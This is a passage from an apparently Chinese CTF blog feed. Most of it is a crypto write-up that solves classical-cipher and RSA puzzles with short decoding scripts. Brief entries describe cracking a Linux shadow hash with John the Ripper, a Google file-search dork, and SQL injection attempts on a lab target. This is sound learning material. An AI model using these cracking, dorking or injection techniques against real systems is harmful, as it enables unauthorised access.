00001&#125;</span><br></pre></td></tr></table></figure>看评论是博多密码（我只是个密码小白我啥也不知道），直接解得到flag。</li></ul><h4 id="小山丘的秘密"><a href="#小山丘的秘密" class="headerlink" title="小山丘的秘密"></a>小山丘的秘密</h4><p>提示： hill能有什么秘密呢</p><ul><li>解题思路：既然提到了hill，那么就迅速查一下有没有叫hill的加密。果然有，中文叫做希尔密码。<br>下载包里很明显是密钥，也就是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;1,2,3&#125;</span><br><span class="line">&#123;0,1,4&#125;</span><br><span class="line">&#123;5,6,0&#125;</span><br></pre></td></tr></table></figure>再看flag文件，A为1，PLGTGBQHM翻译一下就是16 12 7 20 7 2 17 8 13 。（这里注意一下，密钥也跟随A=1，一开始还不确定，用工具解密的时候发现的）<br>（这里居然找到了在线的工具，一个是字母转换数字，一个是希尔加密<code>https://www.boxentriq.com/code-breaking/letters-to-numbers</code>，<code>https://www.dcode.fr/hill-cipher</code>）</li></ul><h4 id="EN-气泡"><a href="#EN-气泡" class="headerlink" title="EN-气泡"></a>EN-气泡</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux</span><br></pre></td></tr></table></figure><ul><li>解题思路：en气泡，气泡的英文就是bubble嘛，搜索bubble crypto，看结果不太行，改关键词为bubble cipher。还是没有，直接搜bubble加密，才看到了其他人对别的题的wp，太坑了。以及这个加密名字叫<code>BubbleBabble</code>。<br>于是借鉴了一下wp借鉴的代码（。。。）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from bubblepy import BubbleBabble</span><br><span class="line"></span><br><span class="line">str&#x3D;&#39;blabla&#39;</span><br><span class="line">Str&#x3D;BubbleBabble()</span><br><span class="line">print(Str.decode(str))</span><br></pre></td></tr></table></figure></li></ul><h4 id="你以为是md5吗"><a href="#你以为是md5吗" class="headerlink" title="你以为是md5吗"></a>你以为是md5吗</h4><p>提示：md5的构成<br>题目：bci177a7a9c7udf69c248647b4dfc6fd84o</p><ul><li>解题思路：既然提示都这么说了，那就查一查md5的构成。<br>然后发现密文不太对，是35位，再根据评论的提示，md5是32位的16进制数，所以去掉超过16进制范围的部分，丢进md5解密。</li></ul><h4 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h4><p>提示：01</p><ul><li>解题思路：摩斯密码。</li></ul><h4 id="黄道十二官"><a href="#黄道十二官" class="headerlink" title="黄道十二官"></a>黄道十二官</h4><ul><li>解题思路：点开图一脸蒙蔽，查了查才发现是个古老的案子中的加密，还挺有意思的。<br>然并卵，还是借鉴了别人另一道题的wp以及代码（顺便说dcode.fr的那个解密不太行），ref：<a href="https://blog.csdn.net/qq_43625917/article/details/113623475">https://blog.csdn.net/qq_43625917/article/details/113623475</a><br>然后用专用的工具AZdecrypt（<a href="https://m.majorgeeks.com/files/details/azdecrypt.html">https://m.majorgeeks.com/files/details/azdecrypt.html</a> ）解密。（代码写的还是有问题，这个脚本先看别人的吧）</li></ul><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><ul><li>提示：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA</span><br></pre></td></tr></table></figure>解题思路：加密新手毫无灵感，按照AA转为==的思路转换密文，再base64解密。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;&#39;e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA&#39;</span><br><span class="line">text1&#x3D;[(ord(c)-4) for c in text]</span><br><span class="line">text2&#x3D;&#39;&#39;.join(chr(c) for c in text1)</span><br><span class="line"></span><br><span class="line">print (text2)</span><br></pre></td></tr></table></figure></li></ul><h4 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h4><ul><li>题目： lf5{ag024c483549d7fd@@1}  一张纸条上凌乱的写着2 1 6 5 3 4<br>解题思路：根据开头的flag大概知道后面的数字是提示了顺序，再看密文长度为24,推断是每六位按照数字顺序打乱。<br>这密文还有问题，顺序不完全对。<br>解题思路：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;&#39;lf5&#123;ag 024c48 3549d7 fd@@1&#125;&#39; #2 1 6 5 3 4</span><br><span class="line">text&#x3D;text.split(&#39; &#39;)</span><br><span class="line"></span><br><span class="line">def calcu(text1):</span><br><span class="line">    text1&#x3D;list(text1)</span><br><span class="line">    order&#x3D;&#39;2 1 5 6 4 3&#39;</span><br><span class="line">    order&#x3D; order.split(&#39; &#39;)</span><br><span class="line">    for i in range(0, len(order)):</span><br><span class="line">        order[i] &#x3D; int(order[i])-1</span><br><span class="line">    list1 &#x3D; [text1[i] for i in order]</span><br><span class="line">    print(&#39;&#39;.join(list1))</span><br><span class="line"></span><br><span class="line">for i in text:</span><br><span class="line">    calcu(i)</span><br></pre></td></tr></table></figure></li></ul><h4 id="-1"><a href="#-1" class="headerlink" title=".!?"></a>.!?</h4><p>解题思路：看题目，应该是Ook。</p><h4 id="一段Base64"><a href="#一段Base64" class="headerlink" title="一段Base64"></a>一段Base64</h4><p>解题思路：converter好使。<a href="https://blog.csdn.net/pdsu161530247/article/details/74640746">https://blog.csdn.net/pdsu161530247/article/details/74640746</a></p><h4 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h4><ul><li>提示：突然天上一道雷电 gndk€rlqhmtkwwp}z<br>解题思路：累次加密。（不知道是累次的就照着flag格式硬猜是ASCII增加）<br>抄个脚本：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">c &#x3D; &quot;gndk&#123;rlqhmtkwwp&#125;z&quot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">while i &lt; len(c):</span><br><span class="line">    num &#x3D; ord(c[i]) - (i + 1)</span><br><span class="line">    flag +&#x3D; chr(num)</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line"></span><br><span class="line">print(&quot;解密：&quot;, flag)</span><br></pre></td></tr></table></figure></li></ul><h4 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h4><ul><li>题目：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;</span><br><span class="line">10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;</span><br><span class="line">11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;</span><br><span class="line">12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;</span><br><span class="line">13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;</span><br><span class="line">14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;</span><br><span class="line"></span><br><span class="line">密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12</span><br><span class="line"></span><br><span class="line">密文：HCBTSXWCRQGLES</span><br></pre></td></tr></table></figure>解题思路：题目翻译成英文大概是thomas jefferson，用关键词thomas jefferson cipher去google，得到wheel cipher，中文应该是杰弗逊圆盘/轮转机加密。但是根据原加密算法看了一下，这个和默认的加密有区别，是根据密钥更改每一行的顺序。<br>抄个代码，自己改了改：ref:<a href="https://www.cnblogs.com/0yst3r-2046/p/11810574.html">https://www.cnblogs.com/0yst3r-2046/p/11810574.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import numpy as np</span><br><span class="line">#秘钥</span><br><span class="line">key&#x3D;&quot;2,5,1,3,6,4,9,7,8,14,10,13,11,12&quot;</span><br><span class="line">#密文</span><br><span class="line">cipher_text &#x3D; &quot;HCBTSXWCRQGLES&quot;</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;file.txt&quot;)</span><br><span class="line">str_first_encry &#x3D; []</span><br><span class="line"></span><br><span class="line">for line in f:</span><br><span class="line">    line &#x3D; line.strip()</span><br><span class="line">    str_first_encry.append(line)</span><br><span class="line"></span><br><span class="line">key_index &#x3D; key.split(&quot;,&quot;)</span><br><span class="line">str_second_encry&#x3D;[]</span><br><span class="line">for k in key_index:</span><br><span class="line">    str_second_encry.append(str_first_encry[int(k)-1])</span><br><span class="line">    print(str_first_encry[int(k)-1])</span><br><span class="line"></span><br><span class="line">for i,ch in enumerate(cipher_text):</span><br><span class="line">    line &#x3D; str_second_encry[i]</span><br><span class="line">    split_index &#x3D; line.index(ch)</span><br><span class="line">    temp&#x3D;[]</span><br><span class="line">    temp[0:len(line)-split_index+1] &#x3D; line[split_index:len(line)]</span><br><span class="line">    temp[len(temp):] &#x3D; line[0:split_index]</span><br><span class="line">    str_second_encry[i] &#x3D; &quot;&quot;.join(temp)</span><br><span class="line">print(&quot;-------------------------------------&quot;)</span><br><span class="line"></span><br><span class="line">list_store &#x3D; []</span><br><span class="line">i &#x3D; 0</span><br><span class="line">for plain in str_second_encry:</span><br><span class="line">    print(plain)</span><br><span class="line">    plain &#x3D; list(plain)</span><br><span class="line">    list_store.append(plain)</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line"></span><br><span class="line">list_store &#x3D; np.array(list_store)</span><br><span class="line">print(&quot;提取每一列内容：&quot;)</span><br><span class="line">#翻转读取每一列的内容，使结果更直观</span><br><span class="line">print(np.transpose(list_store))</span><br></pre></td></tr></table></figure></li></ul><h4 id="这不是MD5"><a href="#这不是MD5" class="headerlink" title="这不是MD5"></a>这不是MD5</h4><ul><li>题目： 666c61677b616537333538376261353662616566357d<br>解题思路：十六进制转字符串。</li></ul><h4 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h4><ul><li>题目：636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067<br>解题思路：十六进制字符串、base64解码都解出来了，然而万万没想到最后一步是看键盘（物理层面）。</li></ul><h4 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h4><ul><li>题目：@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!<br>解题思路：base91</li></ul><h4 id="python-N1CTF"><a href="#python-N1CTF" class="headerlink" title="python(N1CTF)"></a>python(N1CTF)</h4><p>解题思路：ref:<a href="https://blog.csdn.net/crisprx/article/details/107178198">https://blog.csdn.net/crisprx/article/details/107178198</a><br>自己写了好久，还是没写对，看了别人的WP，重点还是在对于Feistel加密结构的了解吧。虽然思路是对了，想办法利用原有代码减少重构量，但是还是没抓准关键点。</p><h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><ul><li>题目： 二进制、八进制、十进制、十六进制，你能分的清吗？<br>解题思路：没找到合适的脚本，自己写吧。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">text &#x3D; &#39;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 &#39; \</span><br><span class="line">       &#39;d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 &#39; \</span><br><span class="line">       &#39;b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 &#39; \</span><br><span class="line">       &#39;b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 &#39; \</span><br><span class="line">       &#39;d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 &#39; \</span><br><span class="line">       &#39;d111 x64 d32 o164 b1101001 x6d o145 x7e&#39;</span><br><span class="line"></span><br><span class="line">temp &#x3D; []</span><br><span class="line">temp &#x3D; text.split(&#39; &#39;)</span><br><span class="line"></span><br><span class="line">for i in range(len(temp)):</span><br><span class="line">    if temp[i][0] &#x3D;&#x3D; &#39;d&#39;:</span><br><span class="line">        temp[i] &#x3D; temp[i][1:]</span><br><span class="line">        temp[i] &#x3D; chr(int(temp[i], 10))</span><br><span class="line">    elif temp[i][0] &#x3D;&#x3D; &#39;x&#39;:</span><br><span class="line">        temp[i] &#x3D; temp[i][1:]</span><br><span class="line">        temp[i] &#x3D; chr(int(temp[i], 16))</span><br><span class="line">    elif temp[i][0] &#x3D;&#x3D; &#39;o&#39;:</span><br><span class="line">        temp[i] &#x3D; temp[i][1:]</span><br><span class="line">        temp[i] &#x3D; chr(int(temp[i], 8))</span><br><span class="line">    elif temp[i][0] &#x3D;&#x3D; &#39;b&#39;:</span><br><span class="line">        temp[i] &#x3D; temp[i][1:]</span><br><span class="line">        temp[i] &#x3D; chr(int(temp[i], 2))</span><br><span class="line">print(&#39;&#39;.join(temp))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h4><p>题目：  y = 17x-8 flag{szzyfimhyzd}</p><ul><li>解题思路：题目提示了，是仿射密码（Affine cipher）。</li></ul><h4 id="Crack-it-6-shadow-hash-crack"><a href="#Crack-it-6-shadow-hash-crack" class="headerlink" title="Crack it($6$ shadow hash crack)"></a>Crack it($6$ shadow hash crack)</h4><ul><li>解题思路：使用john the ripper一步搞定，hashcat在超过32位的win hash上真不行。</li></ul><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><ul><li>解题思路：恶补了一下rsa的知识，ref：<a href="https://zhuanlan.zhihu.com/p/76017554">https://zhuanlan.zhihu.com/p/76017554</a><br>但是由于题目里N特别大，分解不好搞，查了一下，适合使用wiener attack的方法来解。<br>由于Rsactftools有更新，所以利用n,e,c的方式和之前的不一样了，使用方法参照 <a href="https://github.com/Ganapati/RsaCtfTool/issues/247">https://github.com/Ganapati/RsaCtfTool/issues/247</a> 。</li></ul><h4 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h4><ul><li>解题思路：题目提示了，是银河字母。</li></ul><h4 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h4><p>提示：QWIHBLGZZXJSXZNVBZW</p><ul><li>解题思路：看了评论，看来需要跑脚本，而且要base64解码。<br>这里结合base64的原理，四个字符代表三个字节，原题目有23位，也就是base64密文应该为<code>QWIHBLGZZXJSXZNVBZW=</code>的变化，四位四位的取出变形，解码观察是否可以成功解出来，并且能够组成一段话，或者写个脚本批量猜测变化fuzz，看能不能解出可阅读的字节。</li></ul><h4 id="Math-amp-English"><a href="#Math-amp-English" class="headerlink" title="Math&amp;English"></a>Math&amp;English</h4><p>提示：英文、元音。</p><ul><li>解题思路：好家伙，第一个提示直接给我思路整歪了，对着音标解了半天，结果其实作者暗示的是元音密码。。。</li></ul><p>21.33.1.22=FLAG</p><h4 id="给你私钥吧"><a href="#给你私钥吧" class="headerlink" title="给你私钥吧"></a>给你私钥吧</h4><ul><li>解题思路：逆向代码倒是不难，难点在如何获取私钥。<br>顺带补了一下RSA公私钥的知识点，不过RSA相关还是需要再多做做题。<br>这个晚点再补充，Sage下起来有些慢。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_OAEP</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag&#x3D;&#39;GSheKsD2r4g1baPF811ZVmZtzy3srPy7Qrr8uO7cDE&#x2F;OD&#x2F;dIc&#x2F;48r9oGQyKp+XOor4nlHctqW9BzUEbGhX7vJ6aRlV&#x2F;9RULhm6io1syVPsMaqvvVoEAspH&#x2F;hk&#x2F;NXOP383peNdXK6riu9hNTqvlenwgKx9iAuCaPUUsh1s5Vo6s&#x2F;bORFMfGLVx4&#x2F;B+b4pO8YubKe6lUNMLY8eUmgVEvISYcq7Fd1JEzlzA9&#x2F;+ABXneTiFxVd3F6BdPHQyAbIWcE1fJFQao8MyZ6dBb764XuOKi8NvIt+VgVtVpBqtHzECYPYVpecUtqVvUiXhpimWMpvONFafOtObQ8GSN9FSmSwM4w&#x3D;&#x3D;&#39;</span><br><span class="line">cipher_txt &#x3D; base64.b64decode(flag)</span><br><span class="line">f&#x3D;open(r&quot;privatekey.pem&quot;,&quot;r&quot;)</span><br><span class="line">key &#x3D; RSA.importKey(f.read())</span><br><span class="line">cipher &#x3D; PKCS1_OAEP.new(key)</span><br><span class="line">message &#x3D; cipher.decrypt(cipher_txt)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure></li></ul><h4 id="一段新闻"><a href="#一段新闻" class="headerlink" title="一段新闻"></a>一段新闻</h4><ul><li>解题思路：这个真是毫无灵感一脸蒙蔽<br>看了WP才发现，是利用零宽字符转码，这个实在是有意思。</li></ul><h4 id="你懂我的乐谱吗？"><a href="#你懂我的乐谱吗？" class="headerlink" title="你懂我的乐谱吗？"></a>你懂我的乐谱吗？</h4><ul><li>解题思路：一开始以为是乐谱加密/音符加密/Musical Cryptography。<br>然而这只给图没给文字版音符，怎么看怎么不能是让自己抄一遍。<br>看了WP（ref:<a href="https://blog.csdn.net/weixin_45696568/article/details/111413521%EF%BC%89%EF%BC%8C%E6%89%8D%E5%8F%91%E7%8E%B0%E6%98%AF%E8%BD%AC%E7%AE%80%E8%B0%B1%EF%BC%9F">https://blog.csdn.net/weixin_45696568/article/details/111413521），才发现是转简谱？</a><br>服了，不学音乐人不配解题。</li></ul><h4 id="funny-number"><a href="#funny-number" class="headerlink" title="funny number"></a>funny number</h4><ul><li>解题思路：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str(flag).encode(), byteorder&#x3D;&#39;little&#39;</span><br><span class="line"></span><br><span class="line">int a</span><br><span class="line">a &#x3D; str (b)[-175:]</span><br><span class="line">b &#x3D; int.from_bytes(c) &lt;&lt; 10000  </span><br><span class="line">c &#x3D; str(flag).encode(), byteorder&#x3D;&#39;little&#39;</span><br></pre></td></tr></table></figure>拆到这里，有两个难点，一个是byteorder=’little’该如何反转得出flag，另一个是左移10000位的后175位该怎么反推。<br>关键词，模逆运算。<br>直接上大佬的代码吧，为数不多的看了WP也不会的题。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line"></span><br><span class="line">n &#x3D; pow(5,175)</span><br><span class="line">p &#x3D; 5845718273413614238047854434058144506973237928951593664100212455023083304425941087047510727554535833686148194478724602632928856425119454505382766186798132132909079456410238976</span><br><span class="line"></span><br><span class="line">y &#x3D; p &#x2F;&#x2F; pow(2,175)</span><br><span class="line">k &#x3D; pow(2, 9825, n)</span><br><span class="line">kinv &#x3D; int(invert(k, n))</span><br><span class="line">t &#x3D; (y * kinv) % n</span><br><span class="line">print(t)</span><br><span class="line">#t&#x3D;int.from_bytes(str(s).encode(), byteorder&#x3D;&#39;little&#39;)</span><br><span class="line"></span><br><span class="line">flag &#x3D; bytes.fromhex(hex(t)[2:])[::-1]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;/.-&quot;&gt;&lt;/a&gt;/.-&lt;/h4&gt;&lt;p&gt;提示： ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-.</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="124 Crypto" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/124-Crypto/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Dork</title>
    <link href="https://tsunamori.github.io/wiki/Dork/"/>
    <id>https://tsunamori.github.io/wiki/Dork/</id>
    <published>2021-05-12T19:39:52.000Z</published>
    <updated>2021-06-17T14:43:08.361Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Google-Dork"><a href="#Google-Dork" class="headerlink" title="Google Dork"></a>Google Dork</h3><ol><li>Search files:<code>site:test.com ext:zip</code></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Google-Dork&quot;&gt;&lt;a href=&quot;#Google-Dork&quot; class=&quot;headerlink&quot; title=&quot;Google Dork&quot;&gt;&lt;/a&gt;Google Dork&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Search files:&lt;code&gt;site:test</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>WP-BUUCTF-Web</title>
    <link href="https://tsunamori.github.io/wiki/WP-BUUCTF-Web/"/>
    <id>https://tsunamori.github.io/wiki/WP-BUUCTF-Web/</id>
    <published>2021-05-08T16:43:54.000Z</published>
    <updated>2021-12-22T07:59:43.436Z</updated>
    
    <content type="html"><![CDATA[<h4 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h4><p>上工具，收获一个彩蛋：(with –string=”用 sqlmap 是没有灵魂的”)，淦，被预判了。<br>又到了每次打手注都要看看自己笔记的时刻，直接上报错注入看下。淦，注入操作被发现了。<br>那就过burp看过滤了哪些函数。<br>过滤了incert、select。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;极客大挑战-2019-EasySQL-1&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-EasySQL-1&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]EasySQL 1&quot;&gt;&lt;/a&gt;[极客大挑战 2019]EasySQL 1&lt;/h4</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>WP-BugKu-Web</title>
    <link href="https://tsunamori.github.io/wiki/WP-Bugku-Web/"/>
    <id>https://tsunamori.github.io/wiki/WP-Bugku-Web/</id>
    <published>2021-05-08T16:43:54.000Z</published>
    <updated>2021-12-22T07:36:43.932Z</updated>
    
